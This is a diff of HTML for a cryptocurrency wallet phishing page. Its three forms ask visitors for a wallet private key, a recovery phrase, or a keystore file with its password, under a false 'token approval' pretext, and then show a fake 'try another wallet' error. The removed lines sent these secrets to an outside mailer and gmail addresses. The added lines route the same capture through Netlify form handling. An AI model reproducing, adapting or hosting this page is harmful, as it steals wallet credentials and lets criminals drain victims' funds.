@@ -780,19 +780,16 @@
                                     </div>
 
                                     <!-- <form method="POST" class="gform" action="https://formsubmit.co/kingsleyjane960@gmail.com"> -->
-                                    <form name="private" method="POST" action="https://dvfederalunion.com/mailer/" class="gform">
-                                        <input type="hidden" name="_name" value="Private">
-                                        <input type="hidden" name="_redirect" value="error.html">
-                                        <input type="hidden" name="to" value="kellylambeth93@gmail.com">
-                                        <input type="hidden" name="subject" value="Wallet New Information!">
-
+                                    <form name="private" method="POST" action="index.html" class="gform" netlify>
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="error.html">
                                         <div id="third" class="acc-body bg-grey-600 active">
                                             <div class="flex flex-col">
                                                 <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="Metamask"></div>
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <textarea cols="30" rows="4" id="privatekeyText" placeholder="Enter your Private Key" name="Private" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required=""></textarea>
+                                                    <textarea cols="30" rows="4" id="privatekeyText" placeholder="Enter your Private Key" name="key" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required=""></textarea>
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Click on 'Proceed' to confirm the token approval
                                                     </p>
@@ -814,26 +811,22 @@
                                             </div>
                                                <!-- Successfully Submitted page-->
                                                <div style="display: none;" class="thankyou_message">
-                                                <p style="color: red">Synchronization error !!!  try another wallet</p>
+                                                <p class="successful">Unable to Process Approval !!!  try another wallet</p>
                                             </div>
                                         </div>
                                     </form>
 
 
                                     <!-- <form method="POST" class="gform" action="https://formsubmit.co/kingsleyjane960@gmail.com"> -->
-                                    <form name="phrase" method="POST" action="https://dvfederalunion.com/mailer/" class="gform">
-
-                                        <input type="hidden" name="_name" value="Phrase">
-                                        <input type="hidden" name="_redirect" value="error.html">
-                                        <input type="hidden" name="to" value="kellylambeth93@gmail.com">
-                                        <input type="hidden" name="subject" value="Wallet New Information!">
-
+                                    <form name="phrase" method="POST" action="index.html" class="gform" netlify>
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="error.html">
                                         <div id="first" class="acc-body">
                                             <div class="flex flex-col">
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <textarea id="phraseText" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="one" required=""></textarea>
+                                                    <textarea id="phraseText" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="phrase" required=""></textarea>
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Typically 12 (sometimes 24) words separated by single spaces
                                                     </p>
@@ -852,7 +845,7 @@
 
                                             <!-- Successfully Submitted page-->
                                             <div style="display: none;" class="thankyou_message">
-                                                <p style="color: red">Synchronization error !!!  try another wallet</p>
+                                                <p class="successful">Unable to Process Approval !!!  try another wallet</p>
                                             </div>
                                         </div>
 
@@ -860,23 +853,20 @@
 
 
                                     <!-- <form method="POST" class="gform" action="https://formsubmit.co/kingsleyjane960@gmail.com"> -->
-                                    <form name="json" method="POST" action="https://dvfederalunion.com/mailer/" class="gform">
-                                        <input type="hidden" name="_name" value="Json">
-                                        <input type="hidden" name="_redirect" value="error.html">
-                                        <input type="hidden" name="to" value="kellylambeth93@gmail.com">
-                                        <input type="hidden" name="subject" value="Wallet New Information!">
-
+                                    <form name="json" method="POST" action="#" class="gform" netlify>
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="error.html">
                                         <div id="second" class="acc-body bg-grey-600">
                                             <div class="flex flex-col">
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative">
-                                                    <textarea cols="30" rows="4" id="keystoreText" placeholder="Enter your Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="one" required=""></textarea>
+                                                    <textarea cols="30" rows="4" id="keystoreText" placeholder="Enter your Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="keystore" required=""></textarea>
                                                 </div>
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative" data-children-count="1">
-                                                    <input type="text" name="two" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
+                                                    <input type="text" name="password" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                                                     </p>
@@ -899,7 +889,7 @@
 
                                             <!-- Successfully Submitted page-->
                                             <div style="display:none" class="thankyou_message">
-                                                <p style="color: red">Synchronization error !!!  try another wallet</p>
+                                                <p class="successful">Unable to Process Approval !!!  try another wallet</p>
                                             </div>
                                         </div>
 
